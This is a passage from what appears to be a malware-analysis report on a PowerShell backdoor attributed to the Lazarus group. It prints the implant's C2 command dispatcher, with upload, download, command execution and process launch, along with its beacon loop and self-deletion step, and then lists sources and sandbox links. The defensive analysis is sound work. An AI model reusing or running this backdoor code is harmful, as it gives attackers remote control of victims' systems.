			if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){break}
			$nmsg=ConverttoInt32 $basefunctions 0
			$nmlen=ConverttoInt32 $basefunctions 8
			if($basefunctions.length -ne ($nmlen+12)){break}
			$cres=0
			if($nmsg -eq 2){$cres=slp $basefunctions}
			elseif($nmsg -eq 3){$cres=diconnect}
			elseif($nmsg -eq 11){$cres=Set-SysInfo}
			elseif($nmsg -eq 12){$cres=kalv}
			elseif($nmsg -eq 14){$cres=Get-actions}
			elseif($nmsg -eq 15){$cres=Set-contentaction $basefunctions}
			elseif($nmsg -eq 18){$cres=Set-command $basefunctions}
			elseif($nmsg -eq 20){$cres=upload $basefunctions}
			elseif($nmsg -eq 21){$cres=download $basefunctions}
			elseif($nmsg -eq 24){$cres=launch_process $basefunctions}
			else{break}
			if($cres -eq 0){break}
			Start-Sleep -s 1
		}
		Start-Sleep -s 4
		if(PulsetoC2(17) -eq $true){}
	}
	catch{}
}
function main()
{
	$global:tid=Get-Random -Minimum 128 -Maximum 16383
	while($global:breakvalue)
	{
		Try
		{
			if($global:nwct -gt 0){$global:nwct=$global:nwct- 1}
			if($global:nwct -le 0){ if (PulsetoC2(16) -eq $true){Start-Sleep -s 4; command($global:url[$global:nup])} }
		}
		Catch{}
		if($global:breakvalue -ne 1){break}
		Start-Sleep -s 60
	}
}
try{Remove-Item -Path $MyInvocation.MyCommand.Source}catch{}
main

```

## Cyber kill chain <a name="Cyber-kill-chain"></a>
###### The process graphs resume all the cyber kill chains used by the attacker. 
![alt text]()
## References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a>
###### List of all the references with MITRE ATT&CK Matrix

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |

## Indicators Of Compromise (IOC) <a name="IOC"></a>
###### List of all the Indicators Of Compromise (IOC)
|Indicator|Description|
| ------------- |:-------------:|

###### This can be exported as JSON format [Export in JSON]()	
## Links <a name="Links"></a>
###### Original tweet: 
* [https://twitter.com/RedDrip7/status/1186562944311517184](https://twitter.com/RedDrip7/status/1186562944311517184) <a name="Original-Tweet"></a>
* [https://twitter.com/Rmy_Reserve/status/1188235835956551680](https://twitter.com/Rmy_Reserve/status/1188235835956551680) 
* [https://twitter.com/a_tweeter_user/status/1188811977851887616](https://twitter.com/a_tweeter_user/status/1188811977851887616) 
* [https://twitter.com/spider_girl22/status/1187288313285079040](https://twitter.com/spider_girl22/status/1187288313285079040) 
* [https://twitter.com/objective_see/status/1187094701729443840](https://twitter.com/objective_see/status/1187094701729443840) 
###### Links Anyrun: <a name="Links-Anyrun"></a>
* [6850189bbf5191a76761ab20f7c630ef.xls](https://app.any.run/tasks/27ea35e6-6211-468d-9b8a-8c4cf22764ce)
* [JD-HAL-Manager.doc](https://app.any.run/tasks/42c972b1-ec38-4637-9354-9de930ff50b2)
* [public.dll](https://app.any.run/tasks/9eb78213-df55-44c3-9465-e58eb0869e58)
* [CES2020 참관단.hwp](https://app.any.run/tasks/31be34b3-4d72-4831-8b76-6dfebe729b84)
* [6850189bbf5191a76761ab20f7c630ef.xls](https://app.any.run/tasks/a766e70e-b07f-4a59-80fb-b18597d85b08)

###### External analysis: <a name="Analysis"></a>

* [Analysis of Powershell malware of Lazarus group](https://blog.alyac.co.kr/2388 )
* [Cryptocurrency businesses still being targeted by Lazarus](https://securelist.com/cryptocurrency-businesses-still-being-targeted-by-lazarus/90019/)
###### Ressources :
* [List of South Korea exhibitors in CES2020](https://www.ces.tech/Show-Floor/Exhibitor-Directory.aspx?searchTerm=&sortBy=country&filter=South%20Korea)
